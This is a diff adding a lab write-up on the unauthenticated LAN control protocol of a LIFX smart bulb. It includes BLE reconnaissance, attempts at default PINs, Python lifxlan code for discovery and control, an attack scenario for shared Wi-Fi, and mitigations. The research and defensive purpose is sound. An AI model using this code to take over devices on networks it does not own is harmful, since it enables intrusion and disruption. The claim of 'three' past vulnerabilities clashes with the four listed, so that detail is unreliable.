@@ -1,0 +1,182 @@
+# LIFX Smart Bulb – Unauthenticated LAN Control
+**Device:** LIFX A21 – Bedroom Light  
+**Firmware:** v4.112  
+**Attacker:** ClockworkPi uConsole (`192.168.0.29`)  
+**Target:** LIFX A21 (`192.168.0.x`)  
+**Network:** Home WiFi (same subnet)  
+
+---
+
+## 1. Vulnerability Overview
+LIFX bulbs expose a **LAN UDP control protocol** on port 56700 with **zero authentication**. Any device on the same local network can discover and fully control any LIFX bulb — no credentials, no pairing, no app required.
+
+This is a known design issue with LIFX's LAN protocol. It is not a bug per se — it is an intentional feature for local control — but it becomes a vulnerability in any shared network environment (guest networks, shared WiFi, compromised network).
+
+**Impact:**
+- Full control of lighting — on/off, colour, brightness
+- Potential enumeration of smart home device inventory
+- Denial of service (constant state changes, power cycling)
+- In older firmware — WiFi credentials recoverable from flash memory (patched in Q4 2018)
+
+---
+
+## 2. Tools & Setup
+| Tool | Purpose |
+|---|---|
+| ClockworkPi uConsole | Attack platform (ARM, Debian) |
+| Python 3.11 | Scripting |
+| lifxlan library | LIFX LAN protocol implementation |
+| nRF Connect (Android) | BLE recon |
+| HackRF One + Mayhem | BLE scanning/jamming research |
+
+**Install lifxlan:**
+```bash
+sudo pip install lifxlan --break-system-packages
+```
+
+---
+
+## 3. BLE Recon (Initial Discovery)
+Before finding the LAN attack surface, the bulb was first discovered via BLE using **nRF Connect** on Samsung S26 Ultra.
+
+**BLE Advertisement data captured:**
+```
+Device Name:   iZoem
+MAC:           80:E1:26:9D:6A:FF
+Device Type:   LE Only
+Advertising:   Legacy
+Flags:         LE General Discoverable, BR/EDR Not Supported
+Bonding:       Not bonded
+```
+
+**Key observation:** The bulb advertises openly as "iZoem" — not "LIFX" — which is a deliberate obfuscation. Without BLE recon tools it would not be immediately identified as a LIFX device.
+
+**BLE PIN:** Device requires PIN for BLE connection. Default PINs (`000000`, `123456`, `0000`) all failed. Current firmware (v4.112) has no known default PIN.
+
+**Decision:** Pivot from BLE to LAN protocol attack.
+
+---
+
+## 4. LAN Discovery & Control
+
+### Device Discovery
+```python
+from lifxlan import LifxLAN
+
+lan = LifxLAN()
+devices = lan.get_devices()
+print(devices)
+```
+
+**Output:**
+```
+[<Light: 'Bedroom Light' ('Bedroom' @ 'Home')>]
+```
+
+Device discovered with no credentials in under 3 seconds.
+
+### Get Bulb Reference
+```python
+bulb = devices[0]
+```
+
+### Power Control
+```python
+# Turn off
+bulb.set_power("off")
+
+# Turn on
+bulb.set_power("on")
+```
+
+### Colour Control
+Colour values use HSBK format: `[Hue, Saturation, Brightness, Kelvin]`
+All values range from 0–65535 except Kelvin (1500–9000).
+
+```python
+# Red
+bulb.set_color([0, 65535, 65535, 3500])
+
+# Green
+bulb.set_color([21845, 65535, 65535, 3500])
+
+# Blue
+bulb.set_color([43690, 65535, 65535, 3500])
+
+# Warm white
+bulb.set_color([0, 0, 65535, 3500])
+
+# Cool white
+bulb.set_color([0, 0, 65535, 6500])
+```
+
+### Get Device Info
+```python
+print(bulb.get_label())          # Device name
+print(bulb.get_power())          # Power state
+print(bulb.get_color())          # Current HSBK values
+print(bulb.get_wifi_info())      # WiFi signal info
+print(bulb.get_version())        # Firmware version
+```
+
+---
+
+## 5. HSBK Colour Reference
+| Colour | Hue | Saturation | Brightness | Kelvin |
+|---|---|---|---|---|
+| Red | 0 | 65535 | 65535 | 3500 |
+| Orange | 6500 | 65535 | 65535 | 3500 |
+| Yellow | 10922 | 65535 | 65535 | 3500 |
+| Green | 21845 | 65535 | 65535 | 3500 |
+| Cyan | 32767 | 65535 | 65535 | 3500 |
+| Blue | 43690 | 65535 | 65535 | 3500 |
+| Purple | 54612 | 65535 | 65535 | 3500 |
+| Warm White | 0 | 0 | 65535 | 3500 |
+| Cool White | 0 | 0 | 65535 | 6500 |
+
+---
+
+## 6. Historical Vulnerabilities (Now Patched)
+Researcher **LimitedResults** disclosed three vulnerabilities in 2018, all patched in Q4 2018 firmware:
+
+| Vulnerability | Description | Status |
+|---|---|---|
+| WiFi credentials in plaintext | Stored unencrypted in flash memory | Patched |
+| No secure boot | No verification of firmware integrity | Patched |
+| JTAG left enabled | Physical debug access to chip | Patched |
+| Root certificate exposed | RSA key accessible in firmware | Patched |
+
+**Current firmware v4.112** addresses all of the above. However, the **unauthenticated LAN protocol** remains by design.
+
+---
+
+## 7. Attack Scenario
+On a shared network (coffee shop, hotel, guest WiFi, compromised home network):
+
+1. Attacker connects to same WiFi network as victim
+2. Runs `LifxLAN().get_devices()` — discovers all LIFX bulbs
+3. Full control of every LIFX device on network with 5 lines of Python
+4. No credentials, no alerts, no logs on the device
+
+---
+
+## 8. Mitigation
+| Recommendation | Detail |
+|---|---|
+| Isolate IoT devices | Put smart home devices on a separate VLAN/guest network |
+| Firewall rules | Block UDP port 56700 between network segments |
+| Keep firmware updated | Ensures patched vulnerabilities stay patched |
+| Monitor network traffic | Watch for unexpected UDP broadcasts on port 56700 |
+
+---
+
+## 9. Key Takeaways
+- BLE "security" (PIN protection) can be bypassed by pivoting to a different protocol
+- Cheap and expensive IoT devices alike often have unauthenticated local control
+- Always enumerate all attack surfaces — BLE, LAN, cloud API
+- IoT devices should always be on an isolated VLAN in a real environment
+- "It's a feature not a bug" doesn't mean it isn't a vulnerability in the wrong context
+
+---
+
+*Lab: LIFX A21 IoT Research | Device: ClockworkPi uConsole | April 2026*
